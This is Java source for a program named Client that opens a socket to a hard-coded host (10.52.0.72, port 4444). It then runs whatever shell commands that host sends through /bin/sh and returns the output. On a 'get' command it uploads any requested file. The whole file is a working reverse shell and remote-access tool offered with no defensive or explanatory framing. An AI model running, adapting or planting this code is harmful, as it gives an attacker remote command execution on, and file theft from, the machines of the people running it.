import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.net.Socket;
import java.util.concurrent.TimeUnit;

public class Client {
	//hello 
	int port;
	String ip;
	static Socket socket;
	static DataInputStream in;
	static DataOutputStream out;
	BufferedReader br;
	FileInputStream file;
	static ProcessBuilder pb = new ProcessBuilder();
	

	Client(String ip, int port) {
		this.ip = ip;
		this.port = port;
		//System.out.println(createSocket() ? "Connected to " + ip + ":" + port : "Could not connect");
		createSocket();
	}	

	boolean createSocket(){
		try {
			socket = new Socket(ip, port);
			createIOStream();
		} catch(Exception e) {
			return false;
		}
		return true;
	}
	
	void createIOStream() throws Exception {
		in = new DataInputStream(socket.getInputStream());
		out = new DataOutputStream(socket.getOutputStream());
	}
	
	void processCmd(String cmd) throws Exception {
		pb.command("/bin/sh", "-c", cmd);

		Process p = pb.start();
		// p.waitFor();
		if(!p.waitFor(20, TimeUnit.SECONDS)) {
			out.writeUTF("Process Not closed. Pid: " + p.pid());
			out.writeUTF("\000");
		} else if (p.exitValue() != 0) {
			br = new BufferedReader(new InputStreamReader(p.getErrorStream()));
			String line;

			while((line = br.readLine()) != null) {
				out.writeUTF(line);
			}
			out.writeUTF("\000");
			out.flush();
			br.close();
			p.destroy();
		} 
		else {
			br = new BufferedReader(new InputStreamReader(p.getInputStream()));
			String line;
			
			while((line = br.readLine()) != null) {
				out.writeUTF(line);
			}
			out.writeUTF("\000");
			out.flush();
			br.close();
			p.destroy();
		}
	}

	void sendFile(String path) throws Exception {
		File filePath = new File(path);

		if(filePath.isFile()){
			int bytes = 0;
            byte[] buffer = new byte[4 * 1024];
            long size = filePath.length();
			out.writeLong(size);

			file = new FileInputStream(filePath);
			
			while((bytes = file.read(buffer)) != -1) {
				out.write(buffer, 0, bytes);
				out.flush();
			}
			file.close();
			//filePath.close();
		}
		else {
			out.writeLong(-1);
			out.flush();
		}
	}

	boolean changeDir(String cmd) {
		try {
			if(cmd.matches("cd")) {
				pb.directory(new File(System.getProperty("user.dir")));
			} else if (cmd.matches("cd ..")) {
				File f = new File(pb.directory().getParent());
				pb.directory(f);
			} else {
				File f = new File(cmd.split(" ")[1]);
				if(f.isDirectory())
					pb.directory(f);
				else
					return false;
			}
		}
		catch(Exception e) {
			return false;
		}
		return true;
	}


	public static void main(String[] args) {
		pb.directory(new File(System.getProperty("user.dir")));

		try {
			Client client = new Client("10.52.0.72", 4444);
			
			while(socket.isConnected()) {
				String cmd = in.readUTF();

				if(cmd.contains("get ")){ 
					client.sendFile(cmd.split(" ")[1]);
				} else if (cmd.contains("cd")) {
					out.writeUTF(client.changeDir(cmd) ? "[+] Directory changed." : "Could not change Dir.");
					out.writeUTF("\000");
				} else if (cmd.contains("quit")) {
					break;
				}       
				else {
					client.processCmd(cmd);
				}
			}
			in.close();
			out.close();
			socket.close();
		}
		catch ( Exception e ) {
			//System.out.println(e);
		}
	}
}
